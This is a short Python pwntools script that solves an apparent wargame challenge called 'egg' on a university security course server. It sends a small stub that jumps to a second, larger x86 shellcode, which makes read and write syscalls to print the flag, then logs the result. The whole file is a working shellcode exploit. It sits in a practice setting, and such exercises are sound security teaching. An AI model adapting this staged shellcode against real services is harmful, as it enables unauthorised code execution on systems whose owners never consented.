#!/usr/bin/python

from pwn import *

#c = process("binaries/egg")
c = remote("wargames.6447.sec.edu.au", 8006)
#c = gdb.debug("./binaries/egg")

big_shellcode = "\x31\xdb\x31\xd2\x66\xbb\xe8\x03\x89\xe1\xb2\x2b\x31\xc0\xb0\x03\xcd\x80\x31\xdb\xb3\x01\xb2\x2b\xb0\x04\xcd\x80"
small_shellcode = "\x8b\x44\x24\x3c\xff\xd0"

log.info("Sending small payload and big payload...")
c.sendline(small_shellcode)
c.sendline(big_shellcode)

c.recvlines(19)
flag = c.recvline()
log.success("Flag: %s" % (flag))

c.close()
